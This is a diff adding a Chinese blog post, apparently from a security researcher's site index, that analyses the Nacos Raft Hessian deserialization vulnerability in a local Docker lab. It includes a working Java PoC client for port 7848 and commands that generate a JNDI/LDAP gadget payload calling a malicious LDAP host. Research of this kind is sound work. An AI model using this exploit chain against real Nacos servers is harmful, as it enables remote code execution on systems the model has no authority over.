@@ -1,6 +1,162 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
+    <title>Nacos Raft Hessian反序列化漏洞分析</title>
+    <url>/2023/06/09/Nacos-Raft-Hessian%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/</url>
+    <content><![CDATA[<p>Nacos默认的7848端口是用于Nacos集群间Raft协议的通信，该端口的服务在处理部分Jraft请求时会使用Hessian进行反序列化</p>
+<a id="more"></a>
+
+<h2 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h2><p>1.4.0 &lt;= Nacos &lt; 1.4.6</p>
+<p>2.0.0 &lt;= Nacos &lt; 2.2.3</p>
+<h2 id="前置知识"><a href="#前置知识" class="headerlink" title="前置知识"></a>前置知识</h2><h3 id="grpc-java"><a href="#grpc-java" class="headerlink" title="grpc-java"></a>grpc-java</h3><p>作为分析该漏洞的前置知识，需要对照<a href="https://grpc.io/docs/languages/java/basics/" target="_blank" rel="noopener">官方文档</a>快速学一下（搜了一些教程，但讲的版本比较老了，很多不兼容的地方，Nacos用的是比较新的版本，所以还是以官方教程学习靠谱）</p>
+<h4 id="添加依赖"><a href="#添加依赖" class="headerlink" title="添加依赖"></a>添加依赖</h4><p>创建Maven项目 grpc_demo，依赖参考官方<a href="https://github.com/grpc/grpc-java" target="_blank" rel="noopener">README</a></p>
+<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>io.grpc<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>grpc-netty-shaded<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.50.2<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">scope</span>&gt;</span>runtime<span class="tag">&lt;/<span class="name">scope</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>io.grpc<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>grpc-protobuf<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.50.2<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>io.grpc<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>grpc-stub<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.50.2<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!--运行服务端需要--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>io.grpc<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>grpc-api<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.50.2<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+
+
+<h4 id="定义服务"><a href="#定义服务" class="headerlink" title="定义服务"></a>定义服务</h4><p>在src/main目录下创建proto目录，并创建文件helloworld.proto，内容如下：</p>
+<figure class="highlight protobuf"><table><tr><td class="code"><pre><span class="line">syntax = <span class="string">"proto3"</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">option</span> java_multiple_files = <span class="literal">true</span>;</span><br><span class="line"><span class="keyword">option</span> java_package = <span class="string">"com.example.grpc.api"</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">service</span> <span class="title">Greeter</span> </span>&#123;</span><br><span class="line">  <span class="function"><span class="keyword">rpc</span> SayHello (HelloRequest) <span class="keyword">returns</span> (HelloReply) &#123;&#125;</span></span><br><span class="line"><span class="function">&#125;</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">message HelloRequest &#123;</span></span><br><span class="line"><span class="function">  string name = 1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">message</span> <span class="title">HelloReply</span> </span>&#123;</span><br><span class="line">  <span class="built_in">string</span> <span class="class"><span class="keyword">message</span> = 1;</span></span><br><span class="line"><span class="class">&#125;</span></span><br></pre></td></tr></table></figure>
+
+
+
+<h4 id="生成客户端和服务端代码"><a href="#生成客户端和服务端代码" class="headerlink" title="生成客户端和服务端代码"></a>生成客户端和服务端代码</h4><p>可以用Maven插件或者命令行工具生成，我觉得用命令行工具更加清晰，用法参考 <a href="https://grpc.io/docs/languages/java/basics/#generating-client-and-server-code" target="_blank" rel="noopener">https://grpc.io/docs/languages/java/basics/#generating-client-and-server-code</a> 和 <a href="https://grpc.io/docs/languages/java/generated-code/" target="_blank" rel="noopener">https://grpc.io/docs/languages/java/generated-code/</a> </p>
+<h5 id="下载protobuf"><a href="#下载protobuf" class="headerlink" title="下载protobuf"></a>下载protobuf</h5><p><a href="https://github.com/protocolbuffers/protobuf/releases/tag/v23.2" target="_blank" rel="noopener">https://github.com/protocolbuffers/protobuf/releases/tag/v23.2</a></p>
+<p>下载自己系统对应的版本并放入proto目录</p>
+<h5 id="下载protoc-gen-grpc-java"><a href="#下载protoc-gen-grpc-java" class="headerlink" title="下载protoc-gen-grpc-java"></a>下载protoc-gen-grpc-java</h5><p><a href="https://repo1.maven.org/maven2/io/grpc/protoc-gen-grpc-java/1.9.1/" target="_blank" rel="noopener">https://repo1.maven.org/maven2/io/grpc/protoc-gen-grpc-java/1.9.1/</a></p>
+<p>同样下载和系统对应的版本放入proto目录</p>
+<h5 id="生成代码"><a href="#生成代码" class="headerlink" title="生成代码"></a>生成代码</h5><p>cd到proto目录，将下载的protoc-gen-grpc-java重命名为标准名称，添加可执行权限，并运行protoc生成代码</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">mv protoc-gen-grpc-java-1.9.1-osx-x86_64.exe protoc-gen-grpc-java</span><br><span class="line">chmod +x protoc-gen-grpc-java</span><br><span class="line">./protoc --plugin=protoc-gen-grpc-java --grpc-java_out=../java --java_out=../java helloworld.proto</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2023/06/09/Nacos-Raft-Hessian%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20230607232842205.png" alt="image-20230607232842205"></p>
+<h4 id="创建服务端"><a href="#创建服务端" class="headerlink" title="创建服务端"></a>创建服务端</h4><p>实现具体代码：</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.example.grpc.service;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.example.grpc.api.GreeterGrpc;</span><br><span class="line"><span class="keyword">import</span> com.example.grpc.api.HelloReply;</span><br><span class="line"><span class="keyword">import</span> com.example.grpc.api.HelloRequest;</span><br><span class="line"><span class="keyword">import</span> io.grpc.stub.StreamObserver;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">GreeterService</span> <span class="keyword">extends</span> <span class="title">GreeterGrpc</span>.<span class="title">GreeterImplBase</span> </span>&#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">sayHello</span><span class="params">(HelloRequest request, StreamObserver&lt;HelloReply&gt; responseObserver)</span> </span>&#123;</span><br><span class="line">        String name = request.getName();</span><br><span class="line">        HelloReply helloReply = HelloReply.newBuilder().setMessage(<span class="string">"Hello, "</span>+name).build();</span><br><span class="line">        responseObserver.onNext(helloReply);</span><br><span class="line">        responseObserver.onCompleted();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>运行服务：</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.example.grpc;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.example.grpc.service.GreeterService;</span><br><span class="line"><span class="keyword">import</span> io.grpc.Server;</span><br><span class="line"><span class="keyword">import</span> io.grpc.ServerBuilder;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">GreeterServer</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException, InterruptedException </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> port = <span class="number">8888</span>;</span><br><span class="line">        Server server = ServerBuilder.forPort(port).addService(<span class="keyword">new</span> GreeterService()).build();</span><br><span class="line">        server.start();</span><br><span class="line"></span><br><span class="line">        System.out.println(<span class="string">"Running..."</span>);</span><br><span class="line">        server.awaitTermination();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h4 id="创建客户端"><a href="#创建客户端" class="headerlink" title="创建客户端"></a>创建客户端</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.example.grpc;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.example.grpc.api.GreeterGrpc;</span><br><span class="line"><span class="keyword">import</span> com.example.grpc.api.HelloReply;</span><br><span class="line"><span class="keyword">import</span> com.example.grpc.api.HelloRequest;</span><br><span class="line"><span class="keyword">import</span> io.grpc.Channel;</span><br><span class="line"><span class="keyword">import</span> io.grpc.ManagedChannelBuilder;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">GreeterClient</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        String host = <span class="string">"127.0.0.1"</span>;</span><br><span class="line">        <span class="keyword">int</span> port = <span class="number">8888</span>;</span><br><span class="line"></span><br><span class="line">        Channel channel = ManagedChannelBuilder.forAddress(host, port).usePlaintext().build();</span><br><span class="line">        GreeterGrpc.GreeterBlockingStub greeterBlockingStub = GreeterGrpc.newBlockingStub(channel);</span><br><span class="line">        HelloRequest helloRequest = HelloRequest.newBuilder().setName(<span class="string">"leixiao"</span>).build();</span><br><span class="line">        HelloReply helloReply = greeterBlockingStub.sayHello(helloRequest);</span><br><span class="line">        System.out.println(helloReply.getMessage());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+<p>运行客户端后，便完成了一次gRPC请求和响应</p>
+<p><img src="/2023/06/09/Nacos-Raft-Hessian%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20230607235336573.png" alt="image-20230607235336573"></p>
+<h3 id="JRaft"><a href="#JRaft" class="headerlink" title="JRaft"></a>JRaft</h3><p><a href="https://raft.github.io/" target="_blank" rel="noopener">Raft</a>是一种共识算法，<a href="https://www.sofastack.tech/projects/sofa-jraft/overview/" target="_blank" rel="noopener">JRaft</a>是其Java实现，可以看一下官方的Demo</p>
+<h2 id="漏洞环境"><a href="#漏洞环境" class="headerlink" title="漏洞环境"></a>漏洞环境</h2><p>Dockerfile</p>
+<p><a href="https://github.com/alibaba/nacos/releases/download/2.2.2/nacos-server-2.2.2.tar.gz" target="_blank" rel="noopener">nacos-server-2.2.2.tar.gz</a></p>
+<figure class="highlight dockerfile"><table><tr><td class="code"><pre><span class="line"><span class="keyword">FROM</span> openjdk:<span class="number">8</span>u342-jre</span><br><span class="line"></span><br><span class="line"><span class="keyword">ADD</span><span class="bash"> nacos-server-2.2.2.tar.gz /root</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">RUN</span><span class="bash"> apt update &amp;&amp; \</span></span><br><span class="line"><span class="bash">    apt install net-tools procps -y</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">WORKDIR</span><span class="bash"> /root</span></span><br></pre></td></tr></table></figure>
+
+
+
+<p>docker-compose.yml</p>
+<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="attr">version:</span> <span class="string">'3'</span></span><br><span class="line"></span><br><span class="line"><span class="attr">services:</span></span><br><span class="line">  <span class="attr">nacos:</span></span><br><span class="line">    <span class="attr">build:</span> <span class="string">.</span></span><br><span class="line">    <span class="attr">container_name:</span> <span class="string">nacos</span></span><br><span class="line">    <span class="attr">ports:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="number">5005</span><span class="string">:5005</span></span><br><span class="line">      <span class="bullet">-</span> <span class="number">7848</span><span class="string">:7848</span></span><br><span class="line">      <span class="bullet">-</span> <span class="number">8848</span><span class="string">:8848</span></span><br><span class="line">    <span class="attr">environment:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">JAVA_OPT=-agentlib:jdwp=transport=dt_socket,server=y,suspend=n,address=5005</span></span><br><span class="line">    <span class="attr">command:</span> </span><br><span class="line">      <span class="bullet">-</span> <span class="string">/bin/sh</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">-c</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">|</span></span><br><span class="line">        <span class="string">bash</span> <span class="string">nacos/bin/startup.sh</span> <span class="string">-m</span> <span class="string">standalone</span></span><br><span class="line">        <span class="string">tail</span> <span class="string">-f</span> <span class="string">nacos/logs/start.out</span></span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>修复代码中添加了Hessian反序列化白名单：<a href="https://github.com/alibaba/nacos/pull/10542/files" target="_blank" rel="noopener">https://github.com/alibaba/nacos/pull/10542/files</a></p>
+<p>那么最终反序列化的地方很清楚，即： </p>
+<p>com.alibaba.nacos.consistency.serialize.HessianSerializer#deserialize </p>
+<p>再根据<a href="https://github.com/alibaba/nacos/releases/tag/2.2.3" target="_blank" rel="noopener">漏洞描述</a>——“该漏洞仅影响7848端口（默认设置下），一般使用时该端口为Nacos集群间Raft协议的通信端口”，找到可能的漏洞触发点：</p>
+<blockquote>
+<p>在JRaft中，提交的任务最终将会复制应用到所有 raft 节点上的状态机。onApply 是StateMachine最核心的方法。</p>
+</blockquote>
+<p>com.alibaba.nacos.core.distributed.raft.NacosStateMachine#onApply</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onApply</span><span class="params">(Iterator iter)</span> </span>&#123;</span><br><span class="line">  	...</span><br><span class="line">    <span class="keyword">if</span> (message <span class="keyword">instanceof</span> WriteRequest) &#123;</span><br><span class="line">        Response response = processor.onApply((WriteRequest) message);</span><br><span class="line">        postProcessor(response, closure);</span><br><span class="line">    &#125;</span><br><span class="line">  	...</span><br></pre></td></tr></table></figure>
+
+<p><code>processor.onApply</code>有多个实现，先看如下这个：</p>
+<p>com.alibaba.nacos.naming.core.v2.service.impl.PersistentClientOperationServiceImpl#onApply</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> Response <span class="title">onApply</span><span class="params">(WriteRequest request)</span> </span>&#123;</span><br><span class="line">		<span class="keyword">final</span> InstanceStoreRequest instanceRequest = serializer.deserialize(request.getData().toByteArray());</span><br></pre></td></tr></table></figure>
+
+
+
+<p>另外在com.alibaba.nacos.naming.core.v2.service.impl.PersistentClientOperationServiceImpl中有个group方法如下，<code>NAMING_PERSISTENT_SERVICE_GROUP_V2</code>的值即<code>naming_persistent_service_v2</code>会在后面客户端的代码中用到</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> String <span class="title">group</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> Constants.NAMING_PERSISTENT_SERVICE_GROUP_V2;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p><code>group()</code>是作为groupId用于创建RaftGroupService：</p>
+<p>com.alibaba.nacos.core.distributed.raft.JRaftServer#createMultiRaftGroup</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">synchronized</span> <span class="keyword">void</span> <span class="title">createMultiRaftGroup</span><span class="params">(Collection&lt;RequestProcessor4CP&gt; processors)</span> </span>&#123;</span><br><span class="line">		...</span><br><span class="line">    <span class="keyword">for</span> (RequestProcessor4CP processor : processors) &#123;</span><br><span class="line">        <span class="keyword">final</span> String groupName = processor.group();</span><br><span class="line">		...</span><br><span class="line">        RaftGroupService raftGroupService = <span class="keyword">new</span> RaftGroupService(groupName, localPeerId, copy, rpcServer, <span class="keyword">true</span>);</span><br><span class="line">		...</span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="构造请求"><a href="#构造请求" class="headerlink" title="构造请求"></a>构造请求</h3><p>在源码中并没有<code>WriteRequest</code>，<code>Response</code>等类的定义，他们都在nacos-2.2.2/consistency/src/main/proto/consistency.proto 文件中，将该文件复制到文章开头创建的 grpc_demo 项目的proto目录中，借助protoc命令行工具生成代码</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">./protoc --plugin=protoc-gen-grpc-java --grpc-java_out=../java --java_out=../java consistency.proto</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2023/06/09/Nacos-Raft-Hessian%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20230608143518176.png" alt="image-20230608143518176"></p>
+<p>然后参考JRaft给出的<a href="https://www.sofastack.tech/projects/sofa-jraft/counter-example/" target="_blank" rel="noopener">Demo</a>，可以写出相应的客户端代码：</p>
+<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.alipay.sofa<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>jraft-core<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.3.12<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.alipay.sofa<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>rpc-grpc-impl<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.3.12<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.alibaba.nacos.consistency.entity.WriteRequest;</span><br><span class="line"><span class="keyword">import</span> com.alipay.sofa.jraft.entity.PeerId;</span><br><span class="line"><span class="keyword">import</span> com.alipay.sofa.jraft.option.CliOptions;</span><br><span class="line"><span class="keyword">import</span> com.alipay.sofa.jraft.rpc.impl.GrpcClient;</span><br><span class="line"><span class="keyword">import</span> com.alipay.sofa.jraft.rpc.impl.MarshallerHelper;</span><br><span class="line"><span class="keyword">import</span> com.alipay.sofa.jraft.rpc.impl.cli.CliClientServiceImpl;</span><br><span class="line"><span class="keyword">import</span> com.google.protobuf.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.util.Base64;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">App</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">( String[] args )</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        String address = <span class="string">"127.0.0.1:7848"</span>;</span><br><span class="line">        <span class="keyword">byte</span>[] poc = getPoc();</span><br><span class="line"></span><br><span class="line">        CliClientServiceImpl cliClientService = <span class="keyword">new</span> CliClientServiceImpl();</span><br><span class="line">        cliClientService.init(<span class="keyword">new</span> CliOptions());</span><br><span class="line">        PeerId leader = PeerId.parsePeer(address);</span><br><span class="line"></span><br><span class="line">        WriteRequest request = WriteRequest.newBuilder()</span><br><span class="line">                .setGroup(<span class="string">"naming_persistent_service_v2"</span>)</span><br><span class="line">                .setData(ByteString.copyFrom(poc))</span><br><span class="line">                .build();</span><br><span class="line"></span><br><span class="line">        GrpcClient grpcClient = (GrpcClient) cliClientService.getRpcClient();</span><br><span class="line"></span><br><span class="line">        <span class="comment">//反射添加WriteRequest，不然会抛出异常</span></span><br><span class="line">        Field parserClassesField = GrpcClient.class.getDeclaredField("parserClasses");</span><br><span class="line">        parserClassesField.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        Map&lt;String, Message&gt; parserClasses = (Map) parserClassesField.get(grpcClient);</span><br><span class="line">        parserClasses.put(WriteRequest<span class="class">.<span class="keyword">class</span>.<span class="title">getName</span>(),<span class="title">WriteRequest</span>.<span class="title">getDefaultInstance</span>())</span>;</span><br><span class="line">        MarshallerHelper.registerRespInstance(WriteRequest<span class="class">.<span class="keyword">class</span>.<span class="title">getName</span>(),<span class="title">WriteRequest</span>.<span class="title">getDefaultInstance</span>())</span>;</span><br><span class="line"></span><br><span class="line">        Object res = grpcClient.invokeSync(leader.getEndpoint(), request,<span class="number">5000</span>);</span><br><span class="line">        System.out.println(res);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="断点调试"><a href="#断点调试" class="headerlink" title="断点调试"></a>断点调试</h3><p>可以在关键的几处下断点观察：</p>
+<p>com.alibaba.nacos.core.distributed.raft.NacosStateMachine#onApply</p>
+<p>com.alibaba.nacos.naming.core.v2.service.impl.PersistentClientOperationServiceImpl#onApply</p>
+<p>com.alibaba.nacos.consistency.serialize.HessianSerializer#deserialize(byte[])</p>
+<h3 id="Gadget"><a href="#Gadget" class="headerlink" title="Gadget"></a>Gadget</h3><p>目前只是成功让代码走到反序列化的点，还需要构造Hession反序列化的POC：</p>
+<ol>
+<li>通过<a href="https://github.com/l3yx/JNDI-Injection-LDAP-Deserialization" target="_blank" rel="noopener">JNDI-Injection-LDAP-Deserialization</a>启动恶意ldap服务，并使用y4er师傅改的<a href="https://github.com/Y4er/ysoserial" target="_blank" rel="noopener">ysoserial</a>中Jackson这条链</li>
+</ol>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">java -jar JNDI-Injection-LDAP-Deserialization-1.0-SNAPSHOT.jar 1389 `java -jar ~/Tools/Y4er_ysoserial/target/ysoserial-0.0.6-SNAPSHOT-all.jar Jackson <span class="string">'touch /tmp/success'</span>|base64`</span><br></pre></td></tr></table></figure>
+
+<ol start="2">
+<li>然后通过<a href="https://github.com/mbechler/marshalsec" target="_blank" rel="noopener">marshasec</a>生成JDNI注入的POC</li>
+</ol>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.Hessian2 SpringPartiallyComparableAdvisorHolder ldap://host.docker.internal:1389/exp |base64</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2023/06/09/Nacos-Raft-Hessian%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20230609132153478.png" alt="image-20230609132153478"></p>
+<h2 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h2><p>其实前面很多分析过程是有省略的，感觉都写下来会很乱，所以挑了一条漏洞的链路完成漏洞的复现，准备在后面补充一些细节</p>
+<h3 id="只能打一次？"><a href="#只能打一次？" class="headerlink" title="只能打一次？"></a>只能打一次？</h3><p>按前文的POC第一次攻击7848端口的话，调用栈如下：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">deserialize(byte[]), HessianSerializer</span><br><span class="line">onApply(WriteRequest), PersistentClientOperationServiceImpl </span><br><span class="line">onApply(Iterator), NacosStateMachine</span><br><span class="line">doApplyTasks(IteratorImpl), FSMCallerImpl</span><br><span class="line">doCommitted(long), FSMCallerImpl</span><br><span class="line">runApplyTask(FSMCallerImpl$ApplyTask, long, boolean), FSMCallerImpl</span><br><span class="line">access$100(FSMCallerImpl, FSMCallerImpl$ApplyTask, long, boolean), FSMCallerImpl</span><br><span class="line">onEvent(FSMCallerImpl$ApplyTask, long, boolean), FSMCallerImpl$ApplyTaskHandler</span><br><span class="line">onEvent(Object, long, boolean), FSMCallerImpl$ApplyTaskHandler</span><br><span class="line">run(), BatchEventProcessor</span><br></pre></td></tr></table></figure>
+
+<p>JRaft客户端得到的返回数据是反序列化中的异常信息，说明已经完成反序列化过程，这里没有问题</p>
+<p><img src="/2023/06/09/Nacos-Raft-Hessian%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20230609140240776.png" alt="image-20230609140240776"></p>
+<p>但是同样的POC，运行第二次，返回信息是：</p>
+<p><img src="/2023/06/09/Nacos-Raft-Hessian%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20230609140705427.png" alt="image-20230609140705427"></p>
+<p>并且代码无法进入上述调用栈，感觉这里可能和Raft的算法或者协议有关，重启环境也不行。需要销毁环境，重新创建：</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker-compose down; docker-compose up -d</span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="多条触发链路"><a href="#多条触发链路" class="headerlink" title="多条触发链路"></a>多条触发链路</h3><p>在前文中提到的com.alibaba.nacos.core.distributed.raft.JRaftServer#createMultiRaftGroup中创建RaftGroupService的地方下断点，并且对环境进行销毁重启，在重启的同时IDEA连上调试</p>
+<p><img src="/2023/06/09/Nacos-Raft-Hessian%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20230609141722996.png" alt="image-20230609141722996"></p>
+<p><img src="/2023/06/09/Nacos-Raft-Hessian%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20230609141748714.png" alt="image-20230609141748714"></p>
+<p><img src="/2023/06/09/Nacos-Raft-Hessian%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20230609141822866.png" alt="image-20230609141822866"></p>
+<p>会发现其实不只存在一个RaftGroupService：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">naming_persistent_service_v2</span><br><span class="line">naming_instance_metadata</span><br><span class="line">naming_service_metadata</span><br></pre></td></tr></table></figure>
+
+
+
+<p>他们分别对应的”onApply”如下：</p>
+<p>com.alibaba.nacos.naming.core.v2.service.impl.PersistentClientOperationServiceImpl#onApply</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> Response <span class="title">onApply</span><span class="params">(WriteRequest request)</span> </span>&#123;</span><br><span class="line">		<span class="keyword">final</span> InstanceStoreRequest instanceRequest = serializer.deserialize(request.getData().toByteArray());</span><br></pre></td></tr></table></figure>
+
+
+
+<p>com.alibaba.nacos.naming.core.v2.metadata.InstanceMetadataProcessor#onApply</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> Response <span class="title">onApply</span><span class="params">(WriteRequest request)</span> </span>&#123;</span><br><span class="line">    MetadataOperation&lt;InstanceMetadata&gt; op = serializer.deserialize(request.getData().toByteArray(), processType);</span><br><span class="line">    ...</span><br></pre></td></tr></table></figure>
+
+
+
+<p>com.alibaba.nacos.naming.core.v2.metadata.ServiceMetadataProcessor#onApply</p>
